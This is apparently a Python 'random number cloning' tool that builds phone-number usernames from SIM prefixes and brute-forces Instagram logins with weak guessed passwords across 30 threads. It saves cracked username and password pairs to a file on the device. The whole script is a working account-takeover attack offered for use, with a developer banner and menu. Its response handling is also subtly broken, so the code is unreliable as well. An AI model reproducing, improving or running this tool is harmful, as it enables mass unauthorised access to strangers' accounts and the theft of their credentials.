###-------[IMPORT MODULES]-----------####
 
import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
 
###-------[BASIC COLORS]-----------####
reset = "\033[0m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
cyan = "\033[1;36m"
white = "\033[1;37m"
 
###-------[FLASH COLORS]-----------####
colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
 
###-------[LOOP]-----------####
loop = 0
idz = []
oks = []
cps = []
 
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛YounisXyz 🙂💗 \x07')
 
try:os.mkdir('/sdcard/XYZ')
except:pass
 
 
###-------[LOGO]-----------####
logo= f'''\033[1;97m
     Y88b   d88P Y88b   d88P 8888888888P 
      Y88b d88P   Y88b d88P        d88P  
       Y88o88P     Y88o88P        d88P   
\033[1;32m        Y888P       Y888P        d88P
        d888b        888        d88P\033[1;97m
       d88888b       888       d88P      
      d88P Y88b      888      d88P       
     d88P   Y88b     888     d8888888888 
     
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : Muhammad Younis
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://facebook.com/xyzhackers
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/YounisXyz
 \033[1;97m[\033[1;92m•\033[1;97m] Version  : \033[1;92m0.1
\033[1;97m---------------------------------------------------
'''
 
 
###-------[CLEAR TERMINAL]-----------####
def clear():
    os.system("clear")
    print(logo)
 
 
 
###-------[LINE]-----------####
def linex():
    print(f"\033[1;97m--------------------------------------------------")
 
 
 
###-------[MSIN MENU]-----------####
def menu():
    clear()
    print(f" \033[1;97m[\033[1;92m01\033[1;97m] RANDOM NUMBER CLONING")
    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \x1b[38;5;208mVISIT YOUTUBE CHANNEL")
    print(f" \033[1;97m[\033[1;92m03\033[1;97m] \033[1;32mCONTACT DEVELOPER")
    linex()
    younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif younisxyz in ['2','02']:
        os.system("xdg-open https://youtube.com/@MRTRICKERXYZ?si=OSGhb7VAn8a_QX1C")
        time.sleep(3)
        menu()
    elif younisxyz in ['3','03']:
    	os.system("xdg-open https://www.facebook.com/xyzhackers");time.sleep(3);menu()
    else:
        print(f"\n\033[1;91m Select valid option ....")
        time.sleep(3)
        menu()
 
 
###-------[DEF CLONING]-----------####
def random_number():
    clear()
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
    linex()
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        x = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        clear()
        total_idz = str(len(idz))
        print(f"\033[1;96m BRUTE HAS BEEN STARTED BE PATIENT")
        print()
        linex()
        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
        linex()
        for xyz in idz:
            uid = code+xyz
            pww = [xyz,uid] 
            XYZ.submit(crack, uid, pww, total_idz)
    linex()
    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
    menu()
 
 
###-------[METHOD CRACK]-----------####
def crack(uid, pww, total_idz):
    global loop
    global oks
    global cps
    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
    sys.stdout.write(f"\r{x}[YounisXyz] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
            initial_response = session.get("https://www.instagram.com/accounts/login/")
            csrf_token = initial_response.cookies.get("csrftoken")
            time_now = int(time.time())
            device_id = f"android-{str(uuid.uuid4())[:16]}"
            adid = str(uuid.uuid4()) 
            guid = str(uuid.uuid4()) 
            phone_id = str(uuid.uuid4())
            data = {
                "username": uid,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}",
                "queryParams": "{}",
                "optIntoOneTap": False,
                "stopDeletionNonce": "",
                "trustedDeviceRecords": "{}",
                "login_attempt_count": "0",
                "device_id": device_id,
                "adid": adid,
                "guid": guid,
                "phone_id": phone_id,
                "login_nonce_map": "{}",
                "big_blue_token": "",
                "country_codes": "[{\"country_code\":\"1\",\"source\":[\"default\"]}]",
                "jazoest": "22240",  # A calculated checksum, often needed for Instagram (value is an example)
                "user_id": "",
                "csrftoken": csrf_token,
                "ds_user_id": "",
                "_csrftoken": csrf_token,
                "sessionid": ""}
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-CSRFToken": csrf_token,
                "Referer": "https://www.instagram.com/accounts/login/",
                "Origin": "https://www.instagram.com",}
            login_url = "https://www.instagram.com/accounts/login/ajax/"
            response = requests.post(login_url, data=data, headers=headers).json()
            if response.status_code == 200 and response.json().get("authenticated"):
                print(f"\r\033[1;92m [XYZ-OK] {uid} | {pw}")
                open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            else:
                continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except:
        pass
 
 
 
menu()
 
